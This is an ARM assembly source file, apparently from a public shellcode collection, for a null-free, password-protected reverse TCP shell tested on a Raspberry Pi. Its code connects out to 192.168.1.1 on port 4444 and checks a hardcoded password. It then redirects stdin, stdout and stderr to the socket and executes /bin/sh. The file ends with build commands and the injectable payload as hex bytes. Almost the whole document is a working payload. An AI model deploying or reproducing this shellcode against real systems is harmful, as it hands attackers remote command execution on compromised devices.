/*
* Title:  Linux/ARM - Password Protected Reverse Shell TCP (/bin/sh). Null free shellcode (156 bytes)
* Date:   2018-01-15
* Tested: armv7l (Raspberry Pi v3)
* Author: rtmcx - twitter: @rtmcx
*/

.section .text

.global _start
_start:
	/* Enter Thumb mode */
	.ARM
	add		r6, pc, #1
	bx		r6


	.THUMB

/* Create a new socket*/
	/* socket(PF_INET, SOCK_STREAM, 0);
		r0 = 2, r = 1, r2 = 0
		r7 = 281 (SYSCALL for socket)
	*/
	mov		r0, #2				// PF_INET = 2
	mov		r1, #1				// SOCK_STREAM = 1
	eor		r2, r2, r2			// Zero out r2
	mov 	r7, #100			// Put 281 in r7..
	add		r7, #181			// ..in a 2-step operation
	svc		#1					// syscall returns sockid in r0

	mov		r4, r0				// Save sockid in r4


/* Connect to client */
	/* connect(int sockid, const struct sockaddr *addr, int addrlen);
		r0 = sockid, r1 = <struct address>, r2 = 16
		r7 = 283 (SYSCALL for connect)
	*/
	adr 	r1, struct_addr		// Address to struct_addr
	strb	r2, [r1, #1]		// Replace AF_INET with NULL
	mov 	r2, #16				// Address length
	add 	r7, #2				// r7 already contains 281, so add 2 = 283
	svc 	#1					// Client sockid will be returned in r0


/* Send message  */
	/* send(sockid, message, mess_len, 0);
		r0 = sockid, r1 = message_address, r2 = messlen, r3 = 0
		R7 = 289 (syscall for send)
	*/
	mov 	r0, r4				// Restore sockid to r0
	adr 	r1, prompt			// Load address to string "passwd" in r1
	mov 	r2, #8				// 'passwd: ' is 8 bytes
	eor		r3, r3, r3			// Make r3 null
	add		r7, #6				// r7 has 283, add 6 to get 289
	svc 	#1					// Execute syscall


/* Get the response (recv) */
	/* ssize_t recv(int sockid, void *buf, size_t len, int flags);
		r0 = sockid, r1 = buffer_space, r2 = length, r3 = null
		r7 = 291 (recv)
	*/
	mov 	r0, r4				// Restore sockid to r0
	adr 	r1, response		// Load the address to store input in into r1
	mov 	r2, #8				// Read 8 characters
	eor		r3, r3 ,r3			// Zero out r3
	add		r7, #2				// r7 has 289, add 2 to get 291
	svc 	#1					// Execute syscall


/* Compare the received answer to the stored password */
	adr 	r5, passwd 			// Store address to password in r5
	mov 	r6, #9				// Use r6 as counter for number of bytes in password
								// (9 to 1 to avoid null)
cmp_loop:
	ldrb	r2, [r5]			// Put one byte from r5 in r2
	ldrb	r3, [r1]			// Put one byte from r1 in r3

	cmp		r2, r3				// Compare the bytes
	bne 	_exit				// Not equal, exit

	add		r5, #1				// Next byte in password
	add		r1, #1				// Next byte in input
	sub		r6, #1				// Decrement counter

	cmp 	r6, #1				// Are we at 1 yet?
	bne 	cmp_loop			// No, next byte


/* Duplicate STDIN, STDOUT and STERR */
	/* dup2(client_sock_fd, STDIN/STDOUT/STDERR);
		r0 = sockid, r1 = 0/1/2
		r7 = 63 (syscall for dup2)
	*/
	mov 	r0, r4				// Saved sockid
	eor 	r1, r1, r1			// Zero r1 for STDIN
	mov		r7, #63				// Syscall for dup2
	svc 	#1					// Execute syscall

	mov 	r0, r4				// Saved sockid
	add 	r1, #1				// STDOUT (1)
	svc		#1					// Execute syscall

	mov 	r0, r4				// Saved sockid
	add 	r1, #1				// STDERR (2)
	svc		#1					// Execute syscall


/* Execute shell */
	/* execve('/bin/sh', 0, 0);
		r0 --> "/bin/sh", r1 = 0, r2 = 0
		r7 = 11	(syscall for execve)
	*/
	adr 	r0, shellcode		// Address to "/bin/sh"
	eor		r1, r1, r1			// Zero out r1
	eor		r2, r2, r2			// And r2
	strb	r2, [r0, #7]		// Replace 'X' with NULL
	mov		r7, #11				// Syscall for execve
	svc 	#1					// Execute syscall


/* Exit (if wrong password was provided) */
_exit:
	mov 	r0, #1				// return 1
	mov 	r7, #1				// syscall number for exit
	svc 	#1					// execute syscall


/* */
struct_addr:
	.ascii "\x02\xaa"			// AF_INET 0xff will be NULLed
	.ascii "\x11\x5c"			// port 4444
	.ascii "\xc0\xa8\x01\x01" 	// IP Address (192.168.1.1)

shellcode:
	.ascii "/bin/shX"

prompt:
	.ascii "passwd:\x20"		// prompt for password, with space

response:
	.ascii "xxxxxxxx"			// Place to store the response

passwd:
	.ascii "MyPasswd"			// The correct password


/*
Compile and link with:
# as -o shellcode.o shellcode.s
# ld -N shellcode.o -o shellcode

\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x04\x1c\x17\xa1\x4a\x70
\x10\x22\x02\x37\x01\xdf\x20\x1c\x18\xa1\x08\x22\x5b\x40\x06\x37\x01\xdf\x20\x1c\x17\xa1\x08\x22\x5b\x40
\x02\x37\x01\xdf\x16\xa5\x09\x26\x2a\x78\x0b\x78\x9a\x42\x14\xd1\x01\x35\x01\x31\x01\x3e\x01\x2e\xf6\xd1
\x20\x1c\x49\x40\x3f\x27\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x06\xa0\x49\x40\x52\x40
\xc2\x71\x0b\x27\x01\xdf\x01\x20\x01\x27\x01\xdf\x02\xaa\x11\x5c\xc0\xa8\x01\x01\x2f\x62\x69\x6e\x2f\x73
\x68\x58\x70\x61\x73\x73\x77\x64\x3a\x20\x78\x78\x78\x78\x78\x78\x78\x78\x4d\x79\x50\x61\x73\x73\x77\x64
*/